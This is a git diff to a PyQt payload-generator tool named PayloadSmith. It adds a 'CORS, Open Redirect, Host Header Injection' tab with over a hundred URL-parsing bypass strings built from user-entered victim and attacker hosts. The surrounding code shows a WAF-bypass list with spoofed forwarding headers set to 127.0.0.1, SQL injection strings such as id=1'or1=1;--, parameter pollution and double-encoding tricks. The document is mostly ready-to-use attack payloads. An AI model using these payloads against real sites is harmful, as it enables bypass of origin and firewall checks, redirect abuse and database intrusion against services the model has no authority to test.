@@ -52,6 +52,17 @@ class MainWindow(QMainWindow):
                     text=text+array[i]+"\n"
                     i=i+1
         self.Bypass_text_field.setPlainText(text)
+    def Cors_OR_HHIText(self):
+        Bypass_Array=["https://\\\\Attacker/", "https://Victim;.Attacker/", "https://Victim:%40Attacker/", "https://Victim:443:\\%40%40Attacker/", "https://Victim:443\\%40Attacker/", "https://Victim?%40Attacker/", "https://Victim.-.Attacker/", "https://Victim.%5F.Attacker/", "https://Victim.%2C.Attacker/", "https://Victim.;.Attacker/", "https://Victim.%27.Attacker/", "https://Victim.\".Attacker/", "https://Victim.%28.Attacker/", "https://Victim.%29.Attacker/", "https://Victim.{.Attacker/", "https://Victim.}.Attacker/", "https://Victim.*.Attacker/", "https://Victim.%26.Attacker/", "https://Victim.&.Attacker/", "https://Victim.+.Attacker/", "https://Victim.%20.Attacker/", "https://Victim.Attacker/", "https://Victim.=.Attacker/", "https://Victim.%7E.Attacker/", "https://Victim.%24.Attacker/", "https://Victim%5B%40Attacker/", "https://Victim\\;%40Attacker/", "https://Victim#Attacker/", "https://Victim%2523Attacker/", "https://Victim%252EAttacker/", "https://Attacker%09Victim/", "https://Attacker%0AVictim/", "https://Attacker%00Victim/", "https://Attacker%0D%0AVictim/", "https://Attacker%09%0D%0AVictim/", "https://Attacker%E2%80%A8Victim/", "https://Attacker Victim/", "00://Attacker:80;http://Victim:80/ (needs some more adjustment)", "https://Attacker../", "https://Attacker%40%40Victim/", "https://Attacker/?d=Victim/", "https://Attacker/.Victim/", "https://Attacker///Victim/", "https://Attacker\\.Victim/", "https://Attacker%EF%BC%86Victim/", "https://Attacker%EF%B9%A0Victim/", "https://Attacker%2523%40Victim/", "https://Attacker+&%40Victim/", "https://Attacker%00Victim/", "https://localhost.Attacker/", "https://%09Attacker/", "https://%0AAttacker/", "%0D%0A//Attacker", "%0D%0A\\\\Attacker", "/&bsol;/Attacker", "/&NewLine;/Attacker", "/&sol;/Attacker", "/&Tab;/Attacker", "\\%0A\\Attacker", "\\/Attacker", "https:Attacker", "%00http://Attacker", "%01http://Attacker", "%02http://Attacker", "%03http://Attacker", "%04http://Attacker", "%05http://Attacker", "%06http://Attacker", "%07http://Attacker", "%08http://Attacker", "%09http://Attacker", "%0Ahttp://Attacker", "%0Bhttp://Attacker", "%0Chttp://Attacker", "%0Dhttp://Attacker", "%0Ehttp://Attacker", "%0Fhttp://Attacker", "%10http://Attacker", "%11http://Attacker", "%12http://Attacker", "%13http://Attacker", "%14http://Attacker", "%15http://Attacker", "%16http://Attacker", "%17http://Attacker", "%18http://Attacker", "%19http://Attacker", "%1Ahttp://Attacker", "%1Bhttp://Attacker", "%1Chttp://Attacker", "%1Dhttp://Attacker", "%1Ehttp://Attacker", "%1Fhttp://Attacker", "h%09ttp://Attacker", "h%0Attp://Attacker", "h%0Dttp://Attacker", "h%00ttp://Attacker", "http:/\\Attacker", "http:/\\\\Attacker", "http:\\Attacker", "http:/0/Attacker", "https://%E2%80%8BAttacker/", "https://%E2%81%A0Attacker/", "https://%C2%ADAttacker/", "https://127.1/", "https://%CD%8FAttacker/", "https://%E1%A0%8BAttacker/", "https://%E1%A0%8CAttacker/", "https://%E1%A0%8DAttacker/", "https://%E1%A0%8EAttacker/", "https://%E1%A0%8FAttacker/", "https://%E2%80%8BAttacker/", "https://%E2%81%A4Attacker/", "https://%E2%81%A4Attacker/"]
+        text=""
+        for array in Bypass_Array:
+            insideText=array
+            if "Attacker" in array:
+                insideText=insideText.replace("Attacker",str(self.Cors_OR_HHIBypass_attacker_text_field.toPlainText()))
+            if "Victim" in array:
+                insideText=insideText.replace("Victim",str(self.Cors_OR_HHIBypass_victim_text_field.toPlainText()))
+            text=text+insideText+"\n"
+        self.Cors_OR_HHIBypass_text_field.setText(text)
     def wafBypass_BypassText(self):
         Bypass_Array=[["by headers","X-Forwarded-For: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Remote-Addr: 127.0.0.1","Forwarded: for=127.0.0.1, for=127.0.0.1; proto=https; by=127.0.0.1","X-Real-IP: 127.0.0.1","True-Client-IP: 127.0.0.1","CF-Connecting-IP: 127.0.0.1","X-Original-Forwarded-For: 127.0.0.1","Via: 1.1 proxy1, 1.0 proxy2"],["by url manipulation","PHP:\n\tget request url and add %20 after ? and if no ? add ?%20\n\trepeat the parameter you want to manipulate and set malicious code on second appearance E.g. /index.php?id=1&id=1'or1=1;--","ASP:\n\tget request url and add % after ? and if no ? add ?%\n\tbreak the malicious url in multiple parameter appearance E.g. /index.php?id=1\"&id=or&id=%3d1;--","All:\n\tdouble url encode E.g. index.php?id=%22or1%3D1%3B-- into %2522or1%253D1%253B--","Try mix matching Upper and lowercase characters for malicouse code E.g. union into UnIoN (Works on GET nd POST method)"],["by http method manipulation","instead of GET use HEAD","instead of POST use PUT,PATCH,PayloadSmith,Http parameter pollution"]]
         text=""
@@ -66,6 +77,8 @@ class MainWindow(QMainWindow):
                         text=text+array[i]+"\n\t"
                     i=i+1
         self.wafBypass_text_field.setPlainText(text)
+    
+
     def __init__(self):
         super().__init__()
         self.setWindowTitle('PayloadSmith')
@@ -76,6 +89,7 @@ class MainWindow(QMainWindow):
         self.setCentralWidget(self.tab_widget)
 
         # Add tabs
+        self.tab_widget.addTab(self.create_Cors_OR_HHI_tab(), "CORS,Open Redirect,Host Header Injection")
         self.tab_widget.addTab(self.create_wafBypass_tab(), "Waf bypass")
         self.tab_widget.addTab(self.create_xss_tab(), "XSS")
         self.tab_widget.addTab(self.create_url_tab(), "URL")
@@ -134,7 +148,27 @@ class MainWindow(QMainWindow):
                 background-color: #16a085;
             }
         """)
-
+    #Cors_Open Redirect_Host Header Injection
+    def create_Cors_OR_HHI_tab(self):
+        Cors_OR_HHIBypass = QWidget()
+        Cors_OR_HHIBypass.setGeometry(0, 0, 800, 600)
+        Cors_OR_HHIBypass_label = QLabel("Enter the victim address:",Cors_OR_HHIBypass)
+        Cors_OR_HHIBypass_label.move(10, 14)
+        self.Cors_OR_HHIBypass_victim_text_field= QTextEdit(Cors_OR_HHIBypass)
+        self.Cors_OR_HHIBypass_victim_text_field.setGeometry(250,5,350,35)
+        Cors_OR_HHIBypass_label = QLabel("Enter the attacker addresse:",Cors_OR_HHIBypass)
+        Cors_OR_HHIBypass_label.move(10, 56)
+        self.Cors_OR_HHIBypass_attacker_text_field= QTextEdit(Cors_OR_HHIBypass)
+        self.Cors_OR_HHIBypass_attacker_text_field.setGeometry(250,50,350,35)
+        self.Cors_OR_HHIBypass_text_field = QTextEdit(Cors_OR_HHIBypass)
+        self.Cors_OR_HHIBypass_text_field.setGeometry(10, 100, 775, 450)
+        self.Cors_OR_HHIBypass_text_field.setText("")
+        self.Cors_OR_HHIBypass_text_field.setReadOnly(True)
+        self.Cors_OR_HHIBypass_text_field.setStyleSheet("background-color: #dbdbd7;")
+        Cors_OR_HHIBypass_button = QPushButton("Create Payloads", Cors_OR_HHIBypass)
+        Cors_OR_HHIBypass_button.setGeometry(610, 40, 175, 45) 
+        Cors_OR_HHIBypass_button.clicked.connect(self.Cors_OR_HHIText)
+        return Cors_OR_HHIBypass
     def create_wafBypass_tab(self):
         wafBypass_Modes=["by headers","by url manipulation","by http method manipulation"]
         wafBypass = QWidget()
